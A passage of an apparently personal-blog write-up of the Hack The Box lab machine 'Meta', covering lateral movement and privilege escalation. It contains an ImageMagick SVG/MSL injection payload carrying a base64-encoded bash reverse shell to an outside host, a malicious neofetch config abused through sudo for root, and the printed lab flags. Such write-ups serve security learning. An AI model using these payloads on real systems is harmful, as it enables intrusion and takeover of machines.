+www-data@meta:/tmp$ watch -n 1 ls -l /dev/shm/
+www-data@meta:/tmp$ cat /dev/shm/0wned
+uid=1000(thomas) gid=1000(thomas) groups=1000(thomas)
+</code></pre></div><p>So we have code execution as <code>thomas</code>. Let&rsquo;s get a reverse shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@meta:/tmp$ cat &gt; poc.svg
+&lt;image authenticate='ff" `echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash`;"'&gt;  
+  &lt;read filename="pdf:/etc/passwd"/&gt;
+  &lt;get width="base-width" height="base-height" /&gt;
+  &lt;resize geometry="400x400" /&gt;
+  &lt;write filename="test.png" /&gt;
+  &lt;svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt;
+  &lt;image xlink:href="msl:poc.svg" height="100" width="100"/&gt;
+  &lt;/svg&gt;
+&lt;/image&gt;
+^C
+www-data@meta:/tmp$ cp poc.svg /var/www/dev01.artcorp.htb/convert_images/
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.140.
+Ncat: Connection from 10.10.11.140:52884.
+bash: cannot set terminal process group (3281): Inappropriate ioctl for device  
+bash: no job control in this shell
+thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ cd
+cd
+thomas@meta:~$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+thomas@meta:~$ ^Z
+zsh: suspended  ncat -nlvp 4444
+
+<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
+[2]  - continued  ncat -nlvp 4444
+                                 reset xterm
+thomas@meta:~$ export TERM=xterm
+thomas@meta:~$ export SHELL=bash
+thomas@meta:~$ stty rows 50 columns 158
+</code></pre></div><p>At this point, we can read the <code>user.txt</code> flag:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">thomas@meta:~$ cat user.txt
+90e73aa77e1fcd5656877f63ae5c9fc5  
+</code></pre></div><h2 id="privilege-escalation">Privilege escalation</h2><p>This user is able to run <code>sudo</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">thomas@meta:~$ sudo -l
+Matching Defaults entries for thomas on meta:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=XDG_CONFIG_HOME  
+
+User thomas may run the following commands on meta:
+    (root) NOPASSWD: /usr/bin/neofetch \"\"
+</code></pre></div><p>We are allowed to run <code>neofetch</code> as <code>root</code> without password:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>thomas@meta:~$ sudo /usr/bin/neofetch \"\"
+<span class="code-white">       _,met$$$$$gg.</span>          <span class="code-red">root</span>@<span class="code-red">meta</span>
+<span class="code-white">    ,g$$$$$$$$$$$$$$$P.</span>       ---------
+<span class="code-white">  ,g$$P"     """Y$$.".</span>        <span class="code-red">OS</span>: Debian GNU/Linux 10 (buster) x86_64  
+<span class="code-white"> ,$$P'              `$$$.</span>     <span class="code-red">Host</span>: VMware Virtual Platform None
+<span class="code-white">',$$P       ,ggs.     `$$b:</span>   <span class="code-red">Kernel</span>: 4.19.0-17-amd64
+<span class="code-white">`d$$'     ,$P"'   <span class="code-red">.<span class="code-white">    $$$</span>    <span class="code-red">Uptime</span>: 1 hour, 24 mins
+<span class="code-white"> $$P      d$'     <span class="code-red">,<span class="code-white">    $$P</span>    <span class="code-red">Packages</span>: 495 (dpkg)
+<span class="code-white"> $$:      $$.   <span class="code-red">-<span class="code-white">    ,d$$'</span>    <span class="code-red">Shell</span>: bash 5.0.3
+<span class="code-white"> $$;      Y$b._   _,d$P'</span>      <span class="code-red">Terminal</span>: script
+<span class="code-white"> Y$$.    <span class="code-red">`.<span class="code-white">`"Y$$$$P"'</span>         <span class="code-red">CPU</span>: AMD EPYC 7302P 16- (2) @ 2.994GHz
+<span class="code-white"> `$$b      <span class="code-red">"-.__</span>              <span class="code-red">GPU</span>: VMware SVGA II Adapter
+<span class="code-white">  `Y$$</span>                        <span class="code-red">Memory</span>: 139MiB / 1994MiB
+<span class="code-white">   `Y$$.</span>
+<span class="code-white">     `$$b.</span>                       <span class="code-bg-red">   </span><span class="code-bg-green">   </span><span class="code-bg-dark-yellow">   </span><span class="code-bg-dark-blue">   </span><span class="code-bg-magenta">   </span><span class="code-bg-cyan">   </span><span class="code-bg-white">   </span>
+<span class="code-white">       `Y$$b.</span>
+<span class="code-white">          `"Y$b._</span>
+<span class="code-white">              `"""</span>
+</code></pre></div><p>Actually, we can use a configuration file that will be executed when running <code>neofetch</code>. <a href="https://gist.github.com/subicura/5eae8d67da7018964369e94977b4402c">Here</a> we can see an example of such configuration file.</p><p>Since we cannot modify the command, we need to name the configuration file as the default one, which is <code>neofetch/config.conf</code>. But we need to set an environment variable named <code>XDG_CONFIG_HOME</code>, according to the <a href="https://github.com/dylanaraps/neofetch">source</a>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">get_user_config</span><span class="mtk1">() {</span>
+<span class="mtk1">    </span><span class="mtk3"># --config /path/to/config.conf</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> [[ </span><span class="mtk5">-f</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk1">$config_file</span><span class="mtk4">"</span><span class="mtk1"> ]]</span><span class="mtk5">;</span><span class="mtk1"> </span><span class="mtk5">then</span>
+<span class="mtk1">        </span><span class="mtk7">source</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk1">$config_file</span><span class="mtk4">"</span>
+<span class="mtk1">        err </span><span class="mtk4">"Config: Sourced user config. (</span><span class="mtk1">${config_file}</span><span class="mtk4">)"</span>
+<span class="mtk1">        </span><span class="mtk5">return</span>
+
+<span class="mtk1">    </span><span class="mtk5">elif</span><span class="mtk1"> [[ </span><span class="mtk5">-f</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk1">${XDG_CONFIG_HOME}</span><span class="mtk4">/neofetch/config.conf"</span><span class="mtk1"> ]]</span><span class="mtk5">;</span><span class="mtk1"> </span><span class="mtk5">then</span>
+<span class="mtk1">        </span><span class="mtk7">source</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk1">${XDG_CONFIG_HOME}</span><span class="mtk4">/neofetch/config.conf"</span>
+<span class="mtk1">        err </span><span class="mtk4">"Config: Sourced user config.    (</span><span class="mtk1">${XDG_CONFIG_HOME}</span><span class="mtk4">/neofetch/config.conf)"</span>  
+
+<span class="mtk1">    </span><span class="mtk5">elif</span><span class="mtk1"> [[ </span><span class="mtk5">-f</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk1">${XDG_CONFIG_HOME}</span><span class="mtk4">/neofetch/config"</span><span class="mtk1"> ]]</span><span class="mtk5">;</span><span class="mtk1"> </span><span class="mtk5">then</span>
+<span class="mtk1">        </span><span class="mtk7">source</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk1">${XDG_CONFIG_HOME}</span><span class="mtk4">/neofetch/config"</span>
+<span class="mtk1">        err </span><span class="mtk4">"Config: Sourced user config.    (</span><span class="mtk1">${XDG_CONFIG_HOME}</span><span class="mtk4">/neofetch/config)"</span>
+
+<span class="mtk1">    </span><span class="mtk5">elif</span><span class="mtk1"> [[ </span><span class="mtk5">-z</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk1">$no_config</span><span class="mtk4">"</span><span class="mtk1"> ]]</span><span class="mtk5">;</span><span class="mtk1"> </span><span class="mtk5">then</span>
+<span class="mtk1">        config_file=</span><span class="mtk4">"</span><span class="mtk1">${XDG_CONFIG_HOME}</span><span class="mtk4">/neofetch/config.conf"</span>
+
+<span class="mtk1">        </span><span class="mtk3"># The config file doesn't exist, create it.</span>
+<span class="mtk1">        mkdir -p </span><span class="mtk4">"</span><span class="mtk1">${XDG_CONFIG_HOME}</span><span class="mtk4">/neofetch/"</span>
+<span class="mtk1">        </span><span class="mtk7">printf</span><span class="mtk1"> </span><span class="mtk4">'%s\n'</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk1">$config</span><span class="mtk4">"</span><span class="mtk1"> </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk1">$config_file</span><span class="mtk4">"</span>
+<span class="mtk1">    </span><span class="mtk5">fi</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Since this is going to be executed by <code>root</code> (using <code>sudo</code>), let&rsquo;s enter another reverse shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">thomas@meta:~$ cat &gt; neofetch/config.conf
+echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash  
+^C
+thomas@meta:~$ export XDG_CONFIG_HOME=/home/thomas
+</code></pre></div><p>We can execute any command. For more information, we can go to <a href="https://gtfobins.github.io/gtfobins/neofetch#sudo">GTFOBins</a>, or use my tool <a href="https://github.com/7Rocky/gtfobins-cli"><code>gtfobins-cli</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gtfobins-cli</span> --sudo neofetch
+
+<span class="code-bg-green code-black">neofetch</span> ==&gt; <span class="code-yellow">https://gtfobins.github.io/gtfobins/neofetch/</span>
+
+
+<span class="code-red mtku">Sudo</span>
+
+If the binary is allowed to run as superuser by <span class="code-cyan">sudo</span>, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.  
+
+<span class="code-cyan">TF=$(mktemp)</span>
+<span class="code-cyan">echo 'exec /bin/sh' &gt;$TF</span>
+<span class="code-cyan">sudo neofetch --config $TF
+</code></pre></div><p>And if we run <code>neofetch</code> with <code>sudo</code>, we get the reverse shell as <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.140.
+Ncat: Connection from 10.10.11.140:52892.
+root@meta:/home/thomas# script /dev/null -c bash  
+script /dev/null -c bash
+Script started, file is /dev/null
+root@meta:/home/thomas# ^Z
+zsh: suspended  ncat -nlvp 4444
+
+<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
+[1]  + continued  ncat -nlvp 4444
+                                 reset xterm
+root@meta:/home/thomas# export TERM=xterm
+root@meta:/home/thomas# export SHELL=bash
+root@meta:/home/thomas# stty rows 50 columns 158
+root@meta:/home/thomas# cd
+root@meta:~# cat root.txt
+5ace1c9be16771a731dde13dcd8d186e
+</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin-bottom:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#foothold">Foothold</a><ul><li><a href="#exploiting-exiftool">Exploiting <code>exiftool</code></a></li></ul></li><li><a href="#system-enumeration">System enumeration</a></li><li><a href="#lateral-movement-to-user-thomas">Lateral movement to user <code>thomas</code></a><ul><li><a href="#exploiting-mogrify">Exploiting <code>mogrify</code></a></li></ul></li><li><a href="#privilege-escalation">Privilege escalation</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bg-black bottom-0 w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky 2022</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></footer></body></html>
